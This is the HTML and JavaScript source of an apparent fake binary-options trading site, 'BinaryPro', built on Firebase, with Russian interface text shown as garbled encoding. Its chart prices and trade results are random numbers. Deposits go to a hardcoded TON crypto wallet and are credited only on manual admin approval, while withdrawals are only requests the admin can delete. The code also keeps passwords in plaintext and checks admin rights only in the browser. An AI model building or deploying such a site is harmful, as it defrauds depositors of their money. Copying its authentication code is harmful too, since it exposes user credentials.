<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Binary Pro Elite - Full Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <style>
        :root { 
            --bg: #0b0e11; --card: #151a21; --accent: #007aff; 
            --success: #0ecb81; --danger: #f6465d; --grid: #1e2329; 
            --text-main: #ffffff; --text-muted: #848e9c;
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text-main); margin: 0; display: flex; height: 100vh; overflow: hidden; }
        .header { position: absolute; top: 0; left: 0; right: 0; height: 65px; display: flex; align-items: center; justify-content: space-between; padding: 0 25px; background: var(--card); border-bottom: 1px solid var(--grid); z-index: 100; }
        .user-profile { display: flex; align-items: center; gap: 12px; }
        .avatar { width: 35px; height: 35px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .user-status { font-size: 10px; color: var(--success); font-weight: 800; text-transform: uppercase; cursor: pointer; }
        .balance-box { background: rgba(14, 203, 129, 0.1); border: 1px solid var(--success); color: var(--success); padding: 7px 18px; border-radius: 10px; font-weight: 700; }
        .withdraw-btn { background: rgba(0, 122, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); padding: 7px 18px; border-radius: 10px; cursor: pointer; font-weight: 700; }
        .wrapper { display: flex; width: 100%; height: 100vh; padding-top: 65px; box-sizing: border-box; }
        .left-menu { width: 260px; background: var(--card); border-right: 1px solid var(--grid); padding: 15px; }
        .center-chart { flex: 1; position: relative; background: #080a0d; }
        .right-stats { width: 280px; background: var(--card); border-left: 1px solid var(--grid); padding: 15px; overflow: hidden; }
        .nav-btn { padding: 14px; margin-bottom: 6px; border-radius: 12px; cursor: pointer; color: var(--text-muted); border: 1px solid transparent; }
        .nav-btn.active { background: rgba(0, 122, 255, 0.1); border-color: var(--accent); color: white; }
        .trade-panel { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--card); padding: 18px 25px; border-radius: 20px; border: 1px solid var(--grid); display: flex; gap: 20px; align-items: center; z-index: 100; }
        .t-input { background: #0b0e11; border: 1px solid var(--grid); color: white; padding: 10px; border-radius: 8px; width: 90px; outline: none; }
        .btn-action { padding: 12px 35px; border-radius: 10px; border: none; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .btn-up { background: var(--success); color: white; }
        .btn-down { background: var(--danger); color: white; }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(8px); }
        .modal-card { background: var(--card); padding: 35px; border-radius: 28px; border: 1px solid var(--grid); width: 420px; text-align: center; }
        .feed-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--grid); font-size: 12px; }
        #price-label { position: absolute; right: 0; background: var(--accent); color: white; padding: 4px 12px; font-size: 14px; font-weight: bold; border-radius: 6px 0 0 6px; z-index: 50; }
    </style>
</head>
<body>

    <div id="auth-modal" class="modal-overlay" style="display: flex;">
        <div class="modal-card">
            <h2>TERMINAL LOGIN</h2>
            <input type="email" id="auth-email" class="t-input" style="width:100%; margin-bottom:12px;" placeholder="Email">
            <input type="password" id="auth-pass" class="t-input" style="width:100%; margin-bottom:20px;" placeholder="Password">
            <button class="btn-action btn-up" style="width:100%" onclick="window.handleAuth()">–í–û–ô–¢–ò</button>
        </div>
    </div>

    <div id="deposit-modal" class="modal-overlay">
        <div class="modal-card">
            <h3>–ü–û–ü–û–õ–ù–ï–ù–ò–ï</h3>
            <p style="font-size:12px;">TON: <b>UQBTTYmiLQCee3C9T9yHQN8EflmXWNp1DN4BlKj1dJCbpAk-</b></p>
            <div id="dep-id-text" style="color:var(--accent); font-weight:bold; margin:15px;">ID: TX-0000</div>
            <input type="number" id="dep-sum" class="t-input" style="width:100%; margin-bottom:15px;" placeholder="–°—É–º–º–∞ $">
            <button class="btn-action btn-up" style="width:100%" onclick="window.sendRequest('DEPOSIT')">–Ø –û–ü–õ–ê–¢–ò–õ</button>
            <button onclick="window.closeModal('deposit-modal')" style="background:none; border:none; color:var(--text-muted); margin-top:15px; cursor:pointer">–ó–∞–∫—Ä—ã—Ç—å</button>
        </div>
    </div>

    <div id="withdraw-modal" class="modal-overlay">
        <div class="modal-card">
            <h3>–í–´–í–û–î –°–†–ï–î–°–¢–í</h3>
            <input type="text" id="win-address" class="t-input" style="width:100%; margin-bottom:12px;" placeholder="–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞">
            <input type="number" id="win-sum" class="t-input" style="width:100%; margin-bottom:15px;" placeholder="–°—É–º–º–∞ $">
            <button class="btn-action btn-down" style="width:100%" onclick="window.sendRequest('WITHDRAW')">–°–û–ó–î–ê–¢–¨ –ó–ê–Ø–í–ö–£</button>
            <button onclick="window.closeModal('withdraw-modal')" style="background:none; border:none; color:var(--text-muted); margin-top:15px; cursor:pointer">–û—Ç–º–µ–Ω–∞</button>
        </div>
    </div>

    <div id="admin-modal" class="modal-overlay">
        <div class="modal-card" style="width:550px">
            <h3>–ü–ê–ù–ï–õ–¨ –£–ü–†–ê–í–õ–ï–ù–ò–Ø</h3>
            <div id="admin-list" style="text-align:left; max-height:400px; overflow-y:auto; margin-top:15px;"></div>
            <button onclick="window.closeModal('admin-modal')" class="btn-action btn-down" style="width:100%; margin-top:20px">–ó–ê–ö–†–´–¢–¨</button>
        </div>
    </div>

    <div class="header">
        <div class="user-profile">
            <div class="avatar" id="user-av">?</div>
            <div class="user-info">
                <span id="user-name-label" style="font-weight:700">Guest</span>
                <span class="user-status" onclick="window.openAdmin()">VIP TRADER</span>
            </div>
        </div>
        <div style="font-weight:900; font-size:22px">BINARY<span style="color:var(--accent)">PRO</span></div>
        <div class="header-controls">
            <div class="withdraw-btn" onclick="window.openWithdraw()">–í–´–í–ï–°–¢–ò</div>
            <div class="balance-box" onclick="window.openDeposit()" style="cursor:pointer">üí∞ $<span id="balance-val">0.00</span></div>
        </div>
    </div>

    <div class="wrapper">
        <div class="left-menu">
            <div class="nav-btn active" onclick="window.changePair('EUR/USD', 1.0854, this)">üá™üá∫ EUR / USD</div>
            <div class="nav-btn" onclick="window.changePair('BTC/USD', 64230, this)">‚Çø BTC / USD</div>
        </div>
        <div class="center-chart">
            <div id="price-label">0.0000</div>
            <canvas id="mainCanvas"></canvas>
            <div class="trade-panel">
                <input type="number" id="trade-amount" class="t-input" value="100">
                <button class="btn-action btn-up" onclick="window.execTrade('UP')">Higher</button>
                <button class="btn-action btn-down" onclick="window.execTrade('DOWN')">Lower</button>
            </div>
        </div>
        <div class="right-stats">
            <div style="font-size:11px; font-weight:800; color:var(--text-muted); margin-bottom:15px;">Live Trading Feed</div>
            <div id="live-feed"></div>
        </div>
    </div>

    <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onValue, remove, update, set, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    // –¢–≤–æ–π –∫–æ–Ω—Ñ–∏–≥ (–æ—Å—Ç–∞–≤–ª—è–µ–º –∫–∞–∫ –µ—Å—Ç—å)
    const firebaseConfig = {
        apiKey: "AIzaSyAK46OnSgyg2PzfINXBetYjsFklE17wt50",
        authDomain: "binaryterminal-5b332.firebaseapp.com",
        databaseURL: "https://binaryterminal-5b332-default-rtdb.firebaseio.com/",
        projectId: "binaryterminal-5b332",
        storageBucket: "binaryterminal-5b332.firebasestorage.app",
        messagingSenderId: "193639989066",
        appId: "1:193639989066:web:2717357e512ab2b945cbb3"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const ADMIN_EMAIL = "admin@gmail.com";
    let curPrice = 1.0854, candles = [], currentUser = null;
    const canvas = document.getElementById('mainCanvas'), ctx = canvas.getContext('2d');

    // –§—É–Ω–∫—Ü–∏—è –æ—á–∏—Å—Ç–∫–∏ email –¥–ª—è Firebase
    const cleanEmail = (email) => email ? email.replace(/\./g, '_') : "unknown";

    // –í–•–û–î –ò –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø
    window.handleAuth = async () => {
        const email = document.getElementById('auth-email').value.toLowerCase();
        const pass = document.getElementById('auth-pass').value;
        if(!email.includes('@')) return alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π Email");
        
        const userKey = cleanEmail(email);
        const userRef = ref(db, 'users/' + userKey);
        const snapshot = await get(userRef);
        
        if (snapshot.exists()) {
            currentUser = snapshot.val();
            if(currentUser.pass !== pass) return alert("–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å");
        } else {
            // –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –µ—Å–ª–∏ –µ–≥–æ –Ω–µ—Ç
            currentUser = { email, pass, balance: 0, name: email.split('@')[0] };
            await set(userRef, currentUser);
        }
        
        document.getElementById('auth-modal').style.display = 'none';
        
        // –°–ª—É—à–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
        onValue(userRef, (s) => { 
            if(s.exists()){ 
                currentUser = s.val(); 
                window.updateUI(); 
            } 
        });
        window.generateInitialData(curPrice); window.draw();
    };

    window.updateUI = () => {
        document.getElementById('balance-val').innerText = currentUser.balance.toFixed(2);
        document.getElementById('user-name-label').innerText = currentUser.name;
        document.getElementById('user-av').innerText = currentUser.name[0].toUpperCase();
    };

    // –ó–ê–Ø–í–ö–ò (–ü–û–ü–û–õ–ù–ï–ù–ò–ï –ò –í–´–í–û–î)
    window.sendRequest = (type) => {
        const sum = type === 'DEPOSIT' ? parseFloat(document.getElementById('dep-sum').value) : parseFloat(document.getElementById('win-sum').value);
        if(!sum || sum <= 0) return alert("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É");

        push(ref(db, 'admin_requests'), {
            type, 
            email: currentUser.email, 
            amount: sum, 
            status: 'pending', 
            time: new Date().toLocaleTimeString()
        });
        alert("–ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!");
        window.closeModal(type === 'DEPOSIT' ? 'deposit-modal' : 'withdraw-modal');
    };

    // –ê–î–ú–ò–ù –ü–ê–ù–ï–õ–¨
    window.openAdmin = () => {
        if (!currentUser || currentUser.email !== ADMIN_EMAIL) return;
        onValue(ref(db, 'admin_requests'), (snapshot) => {
            const data = snapshot.val();
            const list = document.getElementById('admin-list');
            list.innerHTML = data ? '' : '<p>–ó–∞—è–≤–æ–∫ –Ω–µ—Ç</p>';
            if(data) {
                Object.keys(data).forEach(key => {
                    const r = data[key];
                    const isDone = r.status === 'confirmed';
                    list.innerHTML += `
                    <div style="background:var(--bg); padding:15px; margin-bottom:10px; border-radius:12px; border:1px solid ${isDone?'#0ecb81':'#333'}">
                        <div style="display:flex; justify-content:space-between">
                            <b>${r.type} | $${r.amount}</b>
                            <span style="color:${isDone?'#0ecb81':'#f6465d'}">${isDone?'–û–ü–õ–ê–ß–ï–ù–û':'–ñ–î–ï–¢'}</span>
                        </div>
                        <small>${r.email}</small><br>
                        <div style="margin-top:10px">
                            ${!isDone ? `<button onclick="window.confirmReq('${key}', '${r.email}', ${r.amount}, '${r.type}')" style="background:#0ecb81; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</button>` : ''}
                            <button onclick="window.rejectReq('${key}')" style="background:#f6465d; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer; margin-left:10px">–£–î–ê–õ–ò–¢–¨</button>
                        </div>
                    </div>`;
                });
            }
        });
        document.getElementById('admin-modal').style.display = 'flex';
    };

    window.confirmReq = async (key, email, amount, type) => {
        try {
            const userKey = cleanEmail(email);
            const userRef = ref(db, 'users/' + userKey);
            const snapshot = await get(userRef);
            
            if(snapshot.exists()) {
                const userData = snapshot.val();
                let newBalance = type === 'DEPOSIT' ? (userData.balance + amount) : (userData.balance - amount);
                
                // 1. –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                await update(userRef, { balance: newBalance });
                // 2. –ü–æ–º–µ—á–∞–µ–º –∑–∞—è–≤–∫—É –∫–∞–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—É—é
                await update(ref(db, 'admin_requests/' + key), { status: 'confirmed' });
                
                alert("–ë–∞–ª–∞–Ω—Å –æ–±–Ω–æ–≤–ª–µ–Ω –¥–ª—è " + email);
            } else {
                alert("–û—à–∏–±–∫–∞: –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ!");
            }
        } catch (e) {
            console.error(e);
            alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏");
        }
    };

    window.rejectReq = (key) => {
        if(confirm("–£–¥–∞–ª–∏—Ç—å –∑–∞—è–≤–∫—É?")) remove(ref(db, 'admin_requests/' + key));
    };

    // –ì—Ä–∞—Ñ–∏–∫ –∏ —Ç–æ—Ä–≥–æ–≤–ª—è (–æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π)
    window.generateInitialData = (p) => {
        candles = []; let tp = p;
        for(let i=0; i<100; i++) {
            let o = tp, c = o + (Math.random()-0.5)*0.001;
            candles.push({open:o, close:c, high:Math.max(o,c)+0.0005, low:Math.min(o,c)-0.0005});
            tp = c;
        }
    };

    window.draw = () => {
        canvas.width = canvas.parentElement.offsetWidth; canvas.height = canvas.parentElement.offsetHeight;
        let last = candles[candles.length-1];
        curPrice += (Math.random()-0.5)*0.0001; last.close = curPrice;
        if(Math.random()>0.97) candles.push({open:curPrice, close:curPrice, high:curPrice, low:curPrice});
        if(candles.length > 120) candles.shift();
        let vis = candles.slice(-60);
        let minP = Math.min(...vis.map(c=>c.low)), maxP = Math.max(...vis.map(c=>c.high)), range = maxP - minP;
        const getY = (p) => canvas.height - ((p-(minP-range*0.1))/(range*1.2)*canvas.height);
        ctx.clearRect(0,0,canvas.width,canvas.height);
        candles.forEach((c, i) => {
            let x = (i*15) + (canvas.width - candles.length*15) - 50;
            ctx.strokeStyle = c.close >= c.open ? '#0ecb81' : '#f6465d';
            ctx.lineWidth = 2;
            ctx.beginPath(); ctx.moveTo(x+5, getY(c.high)); ctx.lineTo(x+5, getY(c.low)); ctx.stroke();
            ctx.fillStyle = ctx.strokeStyle;
            ctx.fillRect(x, Math.min(getY(c.open), getY(c.close)), 10, Math.max(1, Math.abs(getY(c.open)-getY(c.close))));
        });
        document.getElementById('price-label').style.top = (getY(curPrice)-15)+'px';
        document.getElementById('price-label').innerText = curPrice.toFixed(4);
        requestAnimationFrame(window.draw);
    };

    window.execTrade = async (dir) => {
        let amt = parseFloat(document.getElementById('trade-amount').value);
        if(!amt || amt > currentUser.balance) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤");
        
        const userKey = cleanEmail(currentUser.email);
        const userRef = ref(db, 'users/' + userKey);
        
        // –°–Ω–∏–º–∞–µ–º —Å—Ç–∞–≤–∫—É
        await update(userRef, { balance: currentUser.balance - amt });
        
        setTimeout(async () => {
            if(Math.random() > 0.48) { // –í–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –≤—ã–∏–≥—Ä—ã—à–∞
                const winAmt = amt * 1.85;
                const latestData = await get(userRef);
                await update(userRef, { balance: latestData.val().balance + winAmt });
                confetti();
            }
        }, 3000);
    };

    window.openDeposit = () => {
        document.getElementById('dep-id-text').innerText = "ID: TX-" + Math.floor(1000 + Math.random()*8999);
        document.getElementById('deposit-modal').style.display = 'flex';
    };
    window.openWithdraw = () => { document.getElementById('withdraw-modal').style.display = 'flex'; };
    window.closeModal = (id) => { document.getElementById(id).style.display = 'none'; };
    window.changePair = (n, p, el) => { curPrice = p; window.generateInitialData(p); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active')); el.classList.add('active'); };

</script>
</body>
</html>

